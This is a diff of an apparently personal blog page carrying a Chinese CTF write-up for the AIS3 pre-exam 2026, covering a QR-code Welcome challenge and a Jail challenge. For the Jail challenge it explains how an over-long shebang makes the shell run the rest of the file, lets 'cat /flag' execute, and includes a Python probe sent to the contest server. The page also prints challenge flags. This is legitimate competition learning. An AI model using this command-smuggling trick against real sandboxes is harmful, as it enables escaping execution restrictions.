@@ -29,7 +29,7 @@
 <meta property="og:locale" content="zh_TW">
 <meta property="og:image" content="https://huiink.github.io/img/AIS3_logo.png">
 <meta property="article:published_time" content="2026-05-17T19:45:00.000Z">
-<meta property="article:modified_time" content="2026-05-28T07:17:20.157Z">
+<meta property="article:modified_time" content="2026-05-28T07:21:27.107Z">
 <meta property="article:author" content="老祖">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="note">
@@ -181,13 +181,13 @@
                 <div class="category-count">3</div>
             </a>
         </div></div>
-            <a class="category-link" href="/categories/Project/">
-                Project
+            <a class="category-link" href="/categories/Program/">
+                Program
                 <div class="category-count">1</div>
             </a>
         
-            <a class="category-link" href="/categories/Program/">
-                Program
+            <a class="category-link" href="/categories/Project/">
+                Project
                 <div class="category-count">1</div>
             </a>
         </div>
@@ -291,7 +291,7 @@
 <div class="article-gallery">
   <div class="article-gallery-photos">
     
-      <a class="article-gallery-img" rel="gallery_cuidirC5lGzeYbO4aobnaVKW8">
+      <a class="article-gallery-img" rel="gallery_cuidPjUB4lTtgBuIDO-gfZ0P5">
         <img src="/img/AIS3_logo.png" itemprop="image">
       </a>
     
@@ -336,9 +336,9 @@
       </header>
       <div class="e-content article-entry" itemprop="articleBody">
         
-          <h1 id="pre-exam-2026-Writeup"><a href="#pre-exam-2026-Writeup" class="headerlink" title="pre-exam 2026 Writeup"></a>pre-exam 2026 Writeup</h1><p>真的很好奇那些針對AI的題目到底是什麼思路 有機會採訪一下<br><del>這或許能讓我在AI的研究上有一大進步</del>(<br><img src="https://hackmd.io/_uploads/rks0_NHezg.png" alt="螢幕擷取畫面 2026-05-18 170429"></p>
+          <h1 id="pre-exam-2026-Writeup"><a href="#pre-exam-2026-Writeup" class="headerlink" title="pre-exam 2026 Writeup"></a>pre-exam 2026 Writeup</h1><p>真的很好奇那些針對AI的題目到底是什麼思路 有機會採訪一下<br><del>這或許能讓我在AI的研究上有一大進步</del>(喜<br><img src="https://hackmd.io/_uploads/rks0_NHezg.png" alt="螢幕擷取畫面 2026-05-18 170429"></p>
 <h2 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h2><p>點開連結後有一直變動的QRCore 截圖後使用手機掃跳轉到一<a target="_blank" rel="noopener" href="https://qrss.netlify.app/scan">網址</a>可以通過掃描不斷變動QR碼的方式來接收檔案 這跟我朋友做的私密通訊軟體加好友的方式很像<br>得到一有flag的圖片<br><img src="https://hackmd.io/_uploads/Skgvw4reze.png" alt="螢幕擷取畫面 2026-05-18 123153"></p>
-<p><code>ais3&#123;hello_llm_welcome to_pre exam 2026!&#125;</code></p>
+<p><code>AIS3&#123;hello_llm_welcome_to_pre_exam_2026!&#125;</code></p>
 <h2 id="Jail"><a href="#Jail" class="headerlink" title="Jail"></a>Jail</h2><p>Linux 核心解析 shebang 時，有個 buffer 上限（通常是 128 bytes）。如果 shebang 行超過這個長度：</p>
 <p>execve() 回傳 ENOEXEC（不是 ENOENT）<br>Shell 收到 ENOEXEC → fallback 當作 shell script 執行<br>第一行 shebang 被當作 shell 的 # 註解忽略<br>後面的 cat &#x2F;flag 就直接跑了<br><code>AIS3&#123;5H3_BA_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_A_NG!&#125;</code></p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> [<span class="number">230</span>, <span class="number">240</span>, <span class="number">250</span>, <span class="number">260</span>, <span class="number">270</span>, <span class="number">300</span>, <span class="number">400</span>]:</span><br><span class="line">    u = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line">    payload = <span class="string">&quot;A&quot;</span> * n + <span class="string">&quot;\necho &quot;</span> + <span class="built_in">str</span>(n)</span><br><span class="line">    r = requests.post(<span class="string">f&quot;http://chals1.ais3.org:10001/<span class="subst">&#123;u&#125;</span>&quot;</span>, data=payload)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;n=<span class="subst">&#123;n&#125;</span>: <span class="subst">&#123;<span class="built_in">repr</span>(r.text)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
